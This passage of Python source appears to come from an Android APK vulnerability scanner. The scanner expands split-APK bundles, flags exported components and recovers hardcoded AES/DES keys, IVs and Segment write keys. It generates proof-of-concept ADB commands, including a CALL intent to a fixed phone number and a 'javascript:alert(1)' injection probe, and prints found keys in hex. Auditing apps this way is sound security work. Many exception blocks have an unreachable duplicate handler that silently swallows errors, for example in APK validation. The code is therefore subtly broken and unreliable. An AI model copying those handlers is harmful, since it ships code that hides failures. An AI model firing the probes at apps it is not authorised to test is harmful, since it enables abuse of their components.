        print(f"{RED}Error: An unexpected error occurred while finding components requiring permissions: {e}{RESET}")
    return components_requiring_permissions

def is_valid_apk(apk_file):
    try:
        with zipfile.ZipFile(apk_file, 'r') as zip_ref:
            bad_file = zip_ref.testzip()
            if bad_file:
                print(f"{YELLOW}Warning: Corrupted file '{bad_file}' in APK '{apk_file}'. Skipping.{RESET}")
                return False
            return True
    except Exception:
        pass
    except zipfile.BadZipFile:
        print(f"{YELLOW}Warning: '{apk_file}' is not a valid APK file or is corrupted. Skipping.{RESET}")
        return False
    except Exception as e:
        print(f"{RED}Error: An unexpected error occurred while validating '{apk_file}': {e}{RESET}")
        return False


# ----------------------------------------------------------------------------
# Split-APK containers: APKPure .xapk, bundletool .apks, APKMirror .apkm.
# Each is a ZIP that bundles a base APK plus split / config / feature APKs.
# pSlip analyzes the base APK (manifest + DEX) and any code-bearing feature
# splits; pure config / ABI / resource splits (no classes*.dex) are skipped.
# ----------------------------------------------------------------------------
CONTAINER_EXTS = ('.xapk', '.apks', '.apkm')
_DEX_RE = re.compile(r'(^|/)classes\d*\.dex$', re.IGNORECASE)


def is_container(path):
    """True if the path has a split-APK container extension."""
    return str(path).lower().endswith(CONTAINER_EXTS)


def _safe_name(s):
    """Sanitize a string for safe use as a flat filename."""
    s = os.path.basename(str(s or ''))
    s = re.sub(r'[^A-Za-z0-9._-]+', '_', s).strip('_')
    return s[:120]


def _apk_has_dex(apk_path):
    """True if the APK contains at least one classes*.dex (i.e. carries code)."""
    try:
        with zipfile.ZipFile(apk_path, 'r') as z:
            return any(_DEX_RE.search(n) for n in z.namelist())
    except Exception:
        return False


def expand_container(container_path, dest_root):
    """
    Expand a split-APK container into standalone APK files for analysis.

    Returns an ordered list of extracted .apk paths (base first, then any
    code-bearing feature splits). Config / ABI / resource-only splits are
    skipped. If the file is a bare APK mislabeled with a container extension,
    returns [container_path]. On failure returns [].
    """
    stem = _safe_name(os.path.splitext(os.path.basename(container_path))[0]) or "container"
    work = os.path.join(dest_root, stem)
    n = 1
    while os.path.exists(work):
        work = os.path.join(dest_root, f"{stem}_{n}")
        n += 1
    try:
        os.makedirs(work, exist_ok=True)
    except Exception:
        return []

    try:
        zf = zipfile.ZipFile(container_path, 'r')
    except Exception:
        print(f"{YELLOW}Warning: '{container_path}' is not a readable archive. Skipping.{RESET}")
        return []

    with zf:
        try:
            names = zf.namelist()
        except Exception:
            return []

        inner_apks = [m for m in names if m.lower().endswith('.apk')]
        if not inner_apks:
            # Mislabeled bare APK (own AndroidManifest at root, no inner .apk).
            if 'AndroidManifest.xml' in set(names):
                return [container_path]
            print(f"{YELLOW}Warning: no APK entries inside '{container_path}'. Skipping.{RESET}")
            return []

        # ---- container metadata (package name + which member is the base) ----
        pkg_name = None
        base_member = None
        meta = None
        for mf in ('manifest.json', 'info.json'):
            if mf in names:
                try:
                    meta = json.loads(zf.read(mf).decode('utf-8', 'replace'))
                except Exception:
                    meta = None
                break
        if isinstance(meta, dict):
            pkg_name = meta.get('package_name') or meta.get('pname') or meta.get('package')
            splits = meta.get('split_apks') or meta.get('splits') or meta.get('split_configs')
            if isinstance(splits, list):
                for s in splits:
                    if isinstance(s, dict):
                        sid = str(s.get('id') or s.get('split') or s.get('name') or '').lower()
                        sfile = s.get('file') or s.get('apk') or s.get('path')
                        if sfile and sid == 'base':
                            base_member = sfile
                            break

        # ---- extract every inner APK to flat, collision-safe names ----
        extracted = {}   # member -> extracted path
        for m in inner_apks:
            safe = _safe_name(os.path.basename(m)) or "split.apk"
            out = os.path.join(work, safe)
            c = 1
            while out in extracted.values() or os.path.exists(out):
                root, ext = os.path.splitext(safe)
                out = os.path.join(work, f"{root}_{c}{ext}")
                c += 1
            try:
                with zf.open(m) as src, open(out, 'wb') as dst:
                    shutil.copyfileobj(src, dst)
                extracted[m] = out
            except Exception:
                continue

        if not extracted:
            print(f"{YELLOW}Warning: could not extract APKs from '{container_path}'. Skipping.{RESET}")
            return []

        def base_of(m):
            return os.path.basename(m).lower()

        # ---- choose the base APK ----
        base_path = None
        if base_member:                                   # 1) explicit from metadata
            tgt = os.path.basename(base_member).lower()
            base_path = next((p for m, p in extracted.items() if base_of(m) == tgt), None)
        if base_path is None:                             # 2) common / bundletool names
            for want in ('base-master.apk', 'base.apk', 'universal.apk'):
                base_path = next((p for m, p in extracted.items() if base_of(m) == want), None)
                if base_path:
                    break
        if base_path is None and pkg_name:                # 3) {package}.apk
            tgt = f"{str(pkg_name).lower()}.apk"
            base_path = next((p for m, p in extracted.items() if base_of(m) == tgt), None)
        if base_path is None:                             # 4) bundletool standalones
            base_path = next((p for m, p in extracted.items() if 'standalone' in base_of(m)), None)
        if base_path is None:                             # 5) largest code-bearing, else largest
            code = [(p, os.path.getsize(p)) for p in extracted.values() if _apk_has_dex(p)]
            pool = code if code else [(p, os.path.getsize(p)) for p in extracted.values()]
            base_path = max(pool, key=lambda t: t[1])[0]

        # ---- analyze base + any other code-bearing (feature) splits ----
        ordered = [base_path] + [p for p in extracted.values()
                                 if p != base_path and _apk_has_dex(p)]

        # ---- friendly rename for attribution (base -> <stem>.apk) ----
        final = []
        for i, p in enumerate(ordered):
            if i == 0:
                target = os.path.join(work, f"{stem}.apk")
            else:
                lbl = _safe_name(os.path.splitext(os.path.basename(p))[0]) or f"split{i}"
                target = os.path.join(work, f"{stem}__{lbl}.apk")
            if target != p and not os.path.exists(target):
                try:
                    os.rename(p, target)
                    p = target
                except Exception:
                    pass
            final.append(p)

        label = pkg_name or stem
        skipped = len(inner_apks) - len(final)
        print(f"{CYAN}Expanded {os.path.basename(container_path)} ({label}): "
              f"analyzing {len(final)} APK(s), skipped {skipped} config/resource split(s).{RESET}")
        return final


def gather_apk_inputs(argument, dest_root_holder):
    """
    Resolve the CLI target into a flat list of analyzable APK paths, expanding
    any .xapk/.apks/.apkm containers found. dest_root_holder is a single-item
    list; if containers are expanded, holder[0] is set to the temp extraction
    root so the caller can clean it up afterwards.
    """
    apk_paths = []
    containers = []
    if os.path.isfile(argument) and argument.endswith(".apk"):
        apk_paths.append(argument)
    elif os.path.isfile(argument) and is_container(argument):
        containers.append(argument)
    elif os.path.isdir(argument):
        for root, _dirs, files in os.walk(argument):
            for file in files:
                full = os.path.join(root, file)
                if file.endswith(".apk"):
                    apk_paths.append(full)
                elif is_container(full):
                    containers.append(full)
    else:
        return None  # signal: invalid input

    if containers:
        root_dir = tempfile.mkdtemp(prefix="pslip_xapk_")
        dest_root_holder[0] = root_dir
        for c in containers:
            apk_paths.extend(expand_container(c, root_dir))
    return apk_paths

def generate_adb_command(package_name, component_name):
    short = component_name.split('/')[-1]
    return (
        f"adb shell am start "
        f"-a android.intent.action.CALL "
        f"-d tel:+15055034455 "
        f"-n {package_name}/{short}"
    )


def generate_js_adb_command(package_name, component_name):
    short = component_name.split('/')[-1]
    return (
        f"adb shell am start "
        f"-a android.intent.action.VIEW "
        f"-d 'javascript:alert(1)' "
        f"-n {package_name}/{short}"
    )

def build_exported_component_adb(package_name, component_name, component_type):
    """
    Generates the correct ADB command depending on component type.
    component_name = full key from dangerous_components (ex: pkg/.MainActivity)
    """

    short = component_name.split('/')[-1]  # Extract class name

    if component_type in ("activity", "activity-alias"):
        return f"adb shell am start -n {package_name}/{short}"

    elif component_type == "service":
        return f"adb shell am startservice -n {package_name}/{short}"

    elif component_type == "receiver":
        return f"adb shell am broadcast -n {package_name}/{short}"

    return f"{package_name}/{short}"




def detect_segment_write_keys(scan_root, package_name):
    """
    Case-insensitive detector for Segment write keys.

    Matches examples like:
      SEGMENT_WRITE_KEY = "..."
      "segmentWriteKey":"..."
    """
    vulnerabilities = []

    key_pattern = re.compile(
        r"""(?ix)
        (?:
            ["']?segment[_-]?write[_-]?key["']?
            \s*[:=]\s*
            ["']([A-Za-z0-9]{10,})["']
        )
        """
    )

    for root, _, files in os.walk(scan_root):
        for file in files:
            if not file.endswith((
                ".java", ".kt", ".json", ".xml", ".txt",
                ".js", ".ts", ".properties", ".smali"
            )):
                continue

            file_path = os.path.join(root, file)
            try:
                with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()

                for match in key_pattern.finditer(content):
                    key_value = match.group(1)
                    vulnerabilities.append({
                        "package_name": package_name,
                        "Component": f"{package_name}/{file}",
                        "Issue Type": "Hardcoded Segment Write Key",
                        "Details": f"Segment write key detected: {key_value}",
                        "Severity": "High",
                        "Confidence": 95,
                        "ADB Command": "N/A"
                    })
            except Exception:
                pass

    return vulnerabilities


def decompile_and_find_aes_keys(apk_file, package_name):
    """AES/DES/IV detection dispatcher.

    Default path is the androguard DEX bytecode scan (find_aes_keys_androguard):
    no decompiler, no Java, no full-app decompile that times out on large APKs.
    Set PSLIP_AES_DEEP=1 (CLI: -aes-deep) to instead run the jadx/apktool
    source-decompile pass below (slower, full Java/smali reconstruction; useful
    for keys assembled across branches or pulled from static fields that the
    linear bytecode model does not resolve).
    """
    if os.environ.get('PSLIP_AES_DEEP') == '1':
        return _find_aes_keys_jadx(apk_file, package_name)
    try:
        return find_aes_keys_androguard(apk_file, package_name)
    except Exception:
        return []


def _find_aes_keys_jadx(apk_file, package_name):
  
    import base64

    vulnerabilities = []
    apk_file_abs = os.path.abspath(apk_file)
    base_dir = os.path.splitext(apk_file_abs)[0] + "_jadx"

    # ---------- helpers shared with Java & smali paths ----------
    def _emit_key(issue_type, key_bytes, src_file):
        L = len(key_bytes or b"")
        if issue_type == 'Hardcoded AES Key' and L not in (16, 24, 32):
            return
        if issue_type == 'Hardcoded DES Key' and L not in (8, 24):
            return
        file_name = os.path.basename(src_file)
        hexval = key_bytes.hex()
        vulnerabilities.append({
            'package_name': package_name,
            'Component': f"{package_name}/{file_name}",
            'Issue Type': issue_type,
            'Details': f"Hex: {hexval}",
            'ADB Command': 'N/A'
        })

    def _emit_iv(iv_bytes, src_file):
        if len(iv_bytes or b"") not in (8, 16):
            return
        file_name = os.path.basename(src_file)
        hexval = iv_bytes.hex()
        vulnerabilities.append({
            'package_name': package_name,
            'Component': f"{package_name}/{file_name}",
            'Issue Type': 'Hardcoded IV',
            'Details': f"Hex: {hexval}",
            'ADB Command': 'N/A'
        })

    def _parse_byte_array_literal(body: str):
        vals = []
        for token in re.split(r'[,{}\s]+', body or ''):
            t = token.strip()
            if not t:
                continue
            try:
                if t.lower().startswith('0x'):
                    vals.append(int(t, 16) & 0xFF)
                else:
                    vals.append(int(t) & 0xFF)
            except Exception:
                pass
            except Exception:
                pass
        return bytes(vals)

    def _maybe_hex_str_to_bytes(s: str):
        if s is None:
            return None
        st = s.strip()
        if re.fullmatch(r'[0-9A-Fa-f]+', st) and len(st) % 2 == 0:
            try:
                return bytes.fromhex(st)
            except Exception:
                pass
            except Exception:
                return None
        return None

    # ---------- tolerant JADX ----------
    def _try_jadx(apk_path, out_dir):
        cand = 'jadx' if _resolve_tool('jadx') else ('jadx-cli' if _resolve_tool('jadx-cli') else None)
        if not cand:
            return False, "jadx not found"
        if os.path.exists(out_dir):
            _rmtree(out_dir)
        try:
            # Speed: we only ever scan decompiled .java/.kt for crypto, never
            # resources -> --no-res skips arsc/XML decode (a large chunk of jadx
            # time on resource-heavy apps). --no-debug-info drops debug-line
            # processing. Const literals (the key material) are unaffected.
            # PSLIP_JADX_THREADS, set by the AES driver, caps each jadx's own
            # thread count so N parallel decompiles don't oversubscribe the CPU.
            jargs = [cand, '-d', out_dir, apk_path, '-q', '--no-res', '--no-debug-info']
            _jt = os.environ.get('PSLIP_JADX_THREADS', '')
            if _jt.isdigit() and int(_jt) > 0:
                jargs += ['-j', _jt]
            proc = _run_tool(jargs,
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                             timeout=JADX_TIMEOUT_SECONDS)
        except Exception as e:
            return False, f"jadx timed out or failed: {e}"
        if proc is None:
            return False, "jadx not found"
        ok = proc.returncode == 0
        if not ok:
            any_java = False
            for root, _, files in os.walk(out_dir):
                if any(f.endswith('.java') or f.endswith('.kt') for f in files):
                    any_java = True
                    break
            if any_java:
                return True, f"jadx returned {proc.returncode} but produced sources"
            return False, _proc_fail_reason(proc, 'jadx')
        return True, "ok"


    def _try_apktool(apk_path, out_dir):
        if not _resolve_tool('apktool'):
            return False, "apktool not found"
        if os.path.exists(out_dir):
            _rmtree(out_dir)
        try:
            proc = _run_tool(['apktool', 'd', '-s', '-o', out_dir, apk_path],
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                             timeout=APKTOOL_TIMEOUT_SECONDS)
        except Exception as e:
            return False, f"apktool timed out or failed: {e}"
        if proc is None:
            return False, "apktool not found"
        if proc.returncode != 0:
            return False, _proc_fail_reason(proc, 'apktool')
        return True, "ok"

   
    def _scan_java(java_root):
        var_string_def = re.compile(
            r'(?:(?:public|private|protected)\s+)?(?:static\s+)?(?:final\s+)?(?:String|char\[\]|java\.lang\.String)\s+([A-Za-z_][A-Za-z0-9_]*)\s*=\s*"([^"]+)";'
        )
        var_bytearr_def = re.compile(
            r'(?:(?:public|private|protected)\s+)?(?:static\s+)?(?:final\s+)?byte\[\]\s+([A-Za-z_][A-Za-z0-9_]*)\s*=\s*new\s+byte\[\]\s*\{([^}]+)\};'
        )
        sks_call = re.compile(r'new\s+SecretKeySpec\s*\(\s*(.+?)\s*,\s*"([^"]+)"\s*\)', re.DOTALL)
        iv_call  = re.compile(r'new\s+IvParameterSpec\s*\(\s*(.+?)\s*\)', re.DOTALL)

        lit_getbytes   = re.compile(r'^"([^"]+)"\s*\.\s*getBytes\s*\(')
        b64_decode     = re.compile(r'Base64\s*\.\s*decode\s*\(\s*"([^"]+)"\s*(?:,\s*Base64\.[A-Z_]+)?\s*\)')
        new_byte_array = re.compile(r'new\s+byte\[\]\s*\{([^}]+)\}')
        var_getbytes   = re.compile(r'^([A-Za-z_][A-Za-z0-9_]*)\s*\.\s*getBytes\s*\(')
        raw_literal    = re.compile(r'^"([^"]+)"\s*$')

        def _resolve_expr_to_bytes(expr: str, variables: dict):
            e = (expr or '').strip()
            m = lit_getbytes.search(e)
            if m:
                s = m.group(1)
                h = _maybe_hex_str_to_bytes(s)
                return h if h is not None else s.encode('utf-8')

            m = b64_decode.search(e)
            if m:
                try:
                    return base64.b64decode(m.group(1))
                except Exception:
                    pass
                except Exception:
                    return None

            m = new_byte_array.search(e)
            if m:
                return _parse_byte_array_literal(m.group(1))

            m = var_getbytes.search(e)
            if m:
                var = m.group(1)
                sval = variables.get(var)
                if sval is None:
                    return None
                if re.search(r'^\s*(?:-?\d+|0x[0-9A-Fa-f]+)\s*(?:,|$)', sval.strip()):
                    return _parse_byte_array_literal(sval)
                h = _maybe_hex_str_to_bytes(sval)
                return h if h is not None else sval.encode('utf-8')

            m = raw_literal.search(e)
            if m:
                s = m.group(1)
                h = _maybe_hex_str_to_bytes(s)
                return h if h is not None else s.encode('utf-8')

            m = re.search(r'Base64\s*\.\s*decode\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*(?:,\s*Base64\.[A-Z_]+)?\s*\)', e)
            if m:
                var = m.group(1)
                sval = variables.get(var)
                if sval:
                    try:
                        return base64.b64decode(sval)
                    except Exception:
                        pass
                    except Exception:
                        return None

            if re.fullmatch(r'[A-Za-z_][A-Za-z0-9_]*', e):
                sval = variables.get(e)
                if sval is not None:
                    if re.search(r'^\s*(?:-?\d+|0x[0-9A-Fa-f]+)\s*(?:,|$)', sval.strip()):
                        return _parse_byte_array_literal(sval)
                    h = _maybe_hex_str_to_bytes(sval)
                    return h if h is not None else sval.encode('utf-8')
            return None

        for root_dir, _, files in os.walk(java_root):
            for file in files:
                if not (file.endswith('.java') or file.endswith('.kt')):
                    continue
                java_file = os.path.join(root_dir, file)
                try:
                    with open(java_file, 'r', encoding='utf-8', errors='ignore') as f:
                        code = f.read()

                    variables = {}
                    for m in var_string_def.finditer(code):
                        variables[m.group(1)] = m.group(2)
                    for m in var_bytearr_def.finditer(code):
                        variables[m.group(1)] = m.group(2)

                    for m in sks_call.finditer(code):
                        arg_expr = m.group(1)
                        algo = (m.group(2) or '').upper()
                        key_bytes = _resolve_expr_to_bytes(arg_expr, variables)
                        if not key_bytes:
                            arr = re.search(r'new\s+byte\[\]\s*\{([^}]+)\}', arg_expr)
                            if arr:
                                key_bytes = _parse_byte_array_literal(arr.group(1))
                        if not key_bytes:
                            continue
                        if 'AES' in algo:
                            _emit_key('Hardcoded AES Key', key_bytes, java_file)
                        elif 'DES' in algo:
                            _emit_key('Hardcoded DES Key', key_bytes, java_file)

                    for m in iv_call.finditer(code):
                        arg_expr = m.group(1)
                        iv_bytes = _resolve_expr_to_bytes(arg_expr, variables)
                        if not iv_bytes:
                            arr = re.search(r'new\s+byte\[\]\s*\{([^}]+)\}', arg_expr)
                            if arr:
                                iv_bytes = _parse_byte_array_literal(arr.group(1))
                        if iv_bytes:
                            _emit_iv(iv_bytes, java_file)
                except Exception:
                    pass
                except Exception as e:
                    print(f"{RED}Error reading file {java_file}: {e}{RESET}")

    # ---------- smali scan ----------
    def _tok(line):
        return [t.strip() for t in line.strip().strip('{}').split(',') if t.strip()]

    def _parse_array_bytes(lines, start_idx):
        vals = []
        i = start_idx
        while i < len(lines):
            line = lines[i].strip()
            if line.startswith('.end array-data'):
                break
            for tok in re.split(r'[\s,]+', line):
                t = tok.strip().rstrip('t')
                if not t:
                    continue
                try:
                    if t.startswith('0x') or t.startswith('-0x'):
                        vals.append(int(t, 16) & 0xFF)
                    else:
                        vals.append(int(t) & 0xFF)
                except Exception:
                    pass
                except Exception:
                    pass
            i += 1
        return bytes(vals), i

    def _scan_smali(smali_root):
        import base64 as _b64
        for root, _, files in os.walk(smali_root):
            for fn in files:
                if not fn.endswith('.smali'):
                    continue
                fpath = os.path.join(root, fn)
                try:
                    with open(fpath, 'r', encoding='utf-8', errors='ignore') as fh:
                        lines = fh.readlines()
                except Exception:
                    pass
                except Exception:
                    continue

                const_str = {}
                barray_for_reg = {}
                array_labels = {}
                reg_label = {}
                pending_result = None

                i = 0
                while i < len(lines):
                    line = lines[i]

                    if line.lstrip().startswith('.method '):
                        const_str.clear()
                        barray_for_reg.clear()
                        reg_label.clear()
                        pending_result = None

                    m = re.search(r'\bconst-string\s+([vp][0-9]+),\s*"([^"]+)"', line)
                    if m:
                        const_str[m.group(1)] = m.group(2)

                    if 'Landroid/util/Base64;->decode' in line:
                        regs = re.search(r'\{([^}]*)\}', line)
                        src_reg = None
                        if regs:
                            reglist = _tok(regs.group(1))
                            if reglist:
                                src_reg = reglist[0]
                        pending_result = ('b64', src_reg)
                    elif 'Ljava/lang/String;->getBytes' in line:
                        regs = re.search(r'\{([^}]*)\}', line)
                        src_reg = None
                        if regs:
                            reglist = _tok(regs.group(1))
                            if reglist:
                                src_reg = reglist[0]
                        pending_result = ('getbytes', src_reg)

                    m = re.search(r'\bmove-result-object\s+([vp][0-9]+)', line)
                    if m and pending_result:
                        kind, sreg = pending_result
                        dst = m.group(1)
                        pending_result = None
                        if sreg and sreg in const_str:
                            try:
                                if kind == 'b64':
                                    barray_for_reg[dst] = _b64.b64decode(const_str[sreg])
                                else:
                                    s = const_str[sreg]
                                    bp = _maybe_hex_str_to_bytes(s)
                                    barray_for_reg[dst] = bp if bp is not None else s.encode('utf-8')
                            except Exception:
                                pass
                            except Exception:
                                pass

                    m = re.search(r'\bfill-array-data\s+([vp][0-9]+),\s*(:\w+)', line)
                    if m:
                        reg_label[m.group(1)] = m.group(2)

                    if line.lstrip().startswith(':') and '.array-data' in (lines[i+1] if i+1 < len(lines) else ''):
                        label = line.strip().split()[0]
                        j = i + 2
                        data, end_idx = _parse_array_bytes(lines, j)
                        array_labels[label] = data
                        for r, lab in list(reg_label.items()):
                            if lab == label:
                                barray_for_reg[r] = data
                        i = end_idx

                    if 'Ljavax/crypto/spec/SecretKeySpec;-><init>(' in line and 'invoke-direct' in line:
                        regs = re.search(r'\{([^}]*)\}', line)
                        if regs:
                            reglist = _tok(regs.group(1))
                            key_reg = reglist[1] if len(reglist) > 1 else None
                            algo_reg = reglist[2] if len(reglist) > 2 else None
                            kb = barray_for_reg.get(key_reg, None)
                            if kb is None and key_reg in reg_label and reg_label[key_reg] in array_labels:
                                kb = array_labels.get(reg_label[key_reg])
                            algo = None
                            if algo_reg and algo_reg in const_str:
                                algo = const_str[algo_reg].upper()
                            if kb:
                                if (algo and 'AES' in algo) or len(kb) in (16,24,32):
                                    _emit_key('Hardcoded AES Key', kb, fpath)
                                elif (algo and 'DES' in algo) or len(kb) in (8,24):
                                    _emit_key('Hardcoded DES Key', kb, fpath)

                    if 'Ljavax/crypto/spec/IvParameterSpec;-><init>(' in line and 'invoke-direct' in line:
                        regs = re.search(r'\{([^}]*)\}', line)
                        if regs:
                            reglist = _tok(regs.group(1))
                            iv_reg = reglist[1] if len(reglist) > 1 else None
                            ivb = barray_for_reg.get(iv_reg, None)
                            if ivb is None and iv_reg in reg_label and reg_label[iv_reg] in array_labels:
                                ivb = array_labels.get(reg_label[iv_reg])
                            if ivb:
                                _emit_iv(ivb, fpath)

                    i += 1

    # ---------- drive ----------
    ok, why = _try_jadx(apk_file_abs, base_dir)
    if ok:
        _scan_java(base_dir)
        try:
            vulnerabilities.extend(detect_segment_write_keys(base_dir, package_name))
        except Exception:
            pass
    else:
        print(f"{YELLOW}Warning: JADX failed for '{apk_file}': {why}{RESET}")

    found_any = any(v.get('Issue Type') in ('Hardcoded AES Key', 'Hardcoded DES Key', 'Hardcoded IV')
                    for v in vulnerabilities)
    if (not ok) or (not found_any):
        # Smali fallback is OPTIONAL. If apktool is not installed, stay silent:
        # the startup banner already reports it missing, and a clean jadx
        # true-negative must not look like a failure. Only attempt (and only
        # warn) when apktool is actually present but errors on this APK.
        if _resolve_tool('apktool'):
            smali_dir = os.path.splitext(apk_file_abs)[0] + "_smali"
            ok2, why2 = _try_apktool(apk_file_abs, smali_dir)
            if ok2:
                _scan_smali(smali_dir)
            else:
                print(f"{YELLOW}Warning: apktool fallback failed for '{apk_file}': {why2}{RESET}")
            try:
                shutil.rmtree(smali_dir, ignore_errors=True)
            except Exception:
                pass

    try:
        shutil.rmtree(base_dir, ignore_errors=True)
    except Exception:
        pass

    return vulnerabilities



def analyze_apk_original(args):
    apk_file, list_permissions_flag, check_js, check_call, collect_permission_vulns = args
    vulnerabilities = []
    permissions = []

    if not is_valid_apk(apk_file):
        return apk_file, vulnerabilities, permissions, None

    base_dir = os.path.splitext(apk_file)[0]
    manifest_file = extract_manifest(apk_file, base_dir)
    if manifest_file is None:
        _rmtree(base_dir)
        return apk_file, vulnerabilities, permissions, None

    try:
        tree = ET.parse(manifest_file)
        root = tree.getroot()
    except Exception:
        _rmtree(base_dir)
        return apk_file, vulnerabilities, permissions, None

    target_sdk_version = get_target_sdk_version(root) or 33
    package_name = get_package_name(root)

    # Manifest hardening (providers, debuggable, allowBackup, etc)
    try:
        vulnerabilities.extend(
            check_manifest_hardening(root, package_name, target_sdk_version)
        )
    except Exception:
        pass

    # Exported + dangerous components
    dangerous_components = find_dangerous_components(
        manifest_file, target_sdk_version, check_js, check_call
    )

    # Process component-level vulns
    for component_name, comp_data in dangerous_components.items():

        comp_type = comp_data["component_type"]

        # ---------------------------------------------------------
        # 1. Generic Exported Component (SERVICES + RECEIVERS ONLY)
        # ---------------------------------------------------------
        if comp_data.get("custom_exported"):

            if comp_type in ("service", "receiver"):  # ***activities excluded***
                adb_cmd = build_exported_component_adb(
                    package_name, component_name, comp_type
                )

                vulnerabilities.append({
                    "package_name": package_name,
                    "Component": component_name,
                    "Issue Type": "Exported Component (Externally Triggerable)",
                    "Details": (
                        "Service or receiver is exported and can be invoked externally. "
                        "This may expose internal functionality to untrusted apps."
                    ),
                    "ADB Command": adb_cmd
                })

        # ---------------------------------------------------------
        # 2. CALL Exposure (activities allowed)
        # ---------------------------------------------------------
        if comp_data["is_call_vulnerable"] and check_call:
            adb_cmd = generate_adb_command(package_name, component_name)
            vulnerabilities.append({
                "package_name": package_name,
                "Component": component_name,
                "Issue Type": "Exposed CALL Permission",
                "Details": "Component can place phone calls without proper permission.",
                "ADB Command": adb_cmd
            })

        # ---------------------------------------------------------
        # 3. Javascript Injection (activities allowed)
        # ---------------------------------------------------------
        if comp_data["is_js_vulnerable"] and check_js:
            adb_cmd = generate_js_adb_command(package_name, component_name)
            vulnerabilities.append({
                "package_name": package_name,
                "Component": component_name,
                "Issue Type": "JavaScript Injection",
                "Details": "Component accepts javascript: scheme or JS MIME type.",
                "ADB Command": adb_cmd
            })

        # ---------------------------------------------------------
        # 4. HTTP Redirects (activities allowed)
        # ---------------------------------------------------------
        if comp_data["is_http_open_vulnerable"]:
            short = component_name.split('/')[-1]
            cmd_http = (
                f"adb shell am start -a android.intent.action.VIEW "
                f"-d 'http://example.com/' "
                f"-n {package_name}/{short}"
            )

            vulnerabilities.append({
                "package_name": package_name,
                "Component": component_name,
                "Issue Type": "URL Redirect",
                "Details": "Component handles HTTP/HTTPS with wildcard host.",
                "ADB Command": cmd_http
            })

    # ---------------------------------------------------------
    # Permissions
    # ---------------------------------------------------------
    apk_name = os.path.basename(apk_file)

    perms_found, perm_vulns, weak_normals = find_permissions(
        manifest_file, apk_name, collect_permission_vulns, package_name
    )

    if perm_vulns:
        for p in perm_vulns:
            p["package_name"] = package_name
        vulnerabilities.extend(perm_vulns)

    if perms_found:
        permissions = perms_found

    # Weak permissions
    if collect_permission_vulns and weak_normals:
        comps_req = find_components_requiring_permissions(
            manifest_file, target_sdk_version, weak_normals, package_name
        )
        for comp in comps_req:
            vulnerabilities.append({
                "package_name": package_name,
                "Component": comp["component_name"],
                "Issue Type": "Weak Permission",
                "Details": (
                    f'Exported {comp["component_type"]} requires weak permission '
                    f'"{comp["required_permission"]}".'
                ),
                "ADB Command": "N/A",
            })

    _rmtree(base_dir)

    return apk_file, vulnerabilities, permissions, package_name





def display_vulnerabilities_table(vulnerabilities):
    """
    group vulnerabilities by 'package_name' and print them in a neat list.
    """
    if not vulnerabilities:
        print(f"{GREEN}None of the selected vulnerabilities were found.{RESET}")
        return

    grouped_by_package = {}
    for vuln in vulnerabilities:
        pkg = vuln.get('package_name', 'N/A')
        if pkg not in grouped_by_package:
            grouped_by_package[pkg] = []
        grouped_by_package[pkg].append(vuln)

    print("-" * 80)
    for pkg_name, vuln_list in grouped_by_package.items():
        print(f"{BOLD}Package: {RESET}{CYAN}{pkg_name}{RESET}")
        print("-" * 80)
        for vuln in vuln_list:
            comp_full = vuln.get('Component', 'N/A')
            print(f"{BOLD}Component:  {RESET}{CYAN}{comp_full}{RESET}")
            print(f"{BOLD}Issue Type: {RESET}{vuln.get('Issue Type', 'N/A')}")
            print(f"{BOLD}Details:    {RESET}{GREEN}{vuln.get('Details', 'N/A')}{RESET}")

            adb_command = vuln.get('ADB Command', 'N/A')
            if adb_command != 'N/A':
                print(f"{BOLD}ADB Command:{RESET}")
                for line in adb_command.split("\n"):
                    print(f"   {YELLOW}{line}{RESET}")
            print("-" * 80)
            
            
def normalize_all_vulnerability_severities(vulnerabilities):
    """
    vulnerabilities have severities consistent with Android 15 rules
    and user-defined category mappings.
    """

    for v in vulnerabilities:
        try:
            _apply_category_severity(v)
        except Exception:
            pass
            
def classify_vulnerability_category(v):
    """
    Assigns a category to each vulnerability based on its Issue Type.
    """

    it = (v.get("Issue Type", "") or "").lower()

    # OAuth scheme hijack
    if it.startswith("oauth"):
        return "OAuth"

    # Hardening issues
    if "hardening:" in it:
        return "Hardening"

    # Component Exposure
    if it.startswith("exported component"):
        return "Component Exposure"
    if it.startswith("exposed call"):
        return "Component Exposure"

    # JavaScript Injection
    if "javascript injection" in it:
        return "JavaScript Injection"

    # URL Redirect
    if it == "url redirect":
        return "URL Redirect"

    # Secrets
    if "hardcoded segment write key" in it:
        return "Secrets"

    # Crypto issues
    if "hardcoded aes key" in it or "hardcoded des key" in it or "hardcoded iv" in it:
        return "Crypto"

    # Permission Weakness
    if it == "weak permission":
        return "Permissions"

    # Fall-back
    return "Other"

from collections import defaultdict

def rollup_severity_counts(vulns):
    """
    Return dict:
      { "Critical":#, "High":#, "Medium":#, "Low":#, "Info":#, "Total":# }
    """

    counts = {"Critical":0,"High":0,"Medium":0,"Low":0,"Info":0,"Total":0}

    for v in vulns:
        sev = (v.get("Severity","Info") or "Info").title()
        if sev not in counts:
            sev = "Info"
        counts[sev] += 1
        counts["Total"] += 1

    return counts


def rollup_by_category(vulnerabilities):
    """
    Produces:
      {
        "OAuth": [v1,v2,...],
        "Hardening": [...],
        "Component Exposure": [...],
        "Crypto": [...],
        "JavaScript Injection": [...],
        "URL Redirect": [...],
        "Permissions": [...],
        "Other": [...]
      }
    """

    cats = defaultdict(list)

    for v in vulnerabilities:
        cat = classify_vulnerability_category(v)
        cats[cat].append(v)

    return cats


def format_category_summary_table(cat_name, vulns):
    """
    Returns HTML summary table for a category.
  
    """

    counts = rollup_severity_counts(vulns)

    html = f"""
    <div class='pkg-header'>
      <div class='pkg-title'>{cat_name} Summary</div>
    </div>
    <table>
      <tr>
        <th>Critical</th><th>High</th><th>Medium</th>
        <th>Low</th><th>Info</th><th>Total</th>
      </tr>
      <tr>
        <td>{counts['Critical']}</td>
        <td>{counts['High']}</td>
        <td>{counts['Medium']}</td>
        <td>{counts['Low']}</td>
        <td>{counts['Info']}</td>
        <td>{counts['Total']}</td>
      </tr>
    </table>
    <br/>
    """

    return html

            
def generate_html_report(vulnerabilities, permissions, output_file):
    # Normalize severity across all categories before report generation
    normalize_all_vulnerability_severities(vulnerabilities)

    import html as _htmlmod
    import json as _json

    def _esc(x):
        return _htmlmod.escape("" if x is None else str(x), quote=True)

    SEV_LABELS = ["Critical", "High", "Medium", "Low", "Info"]
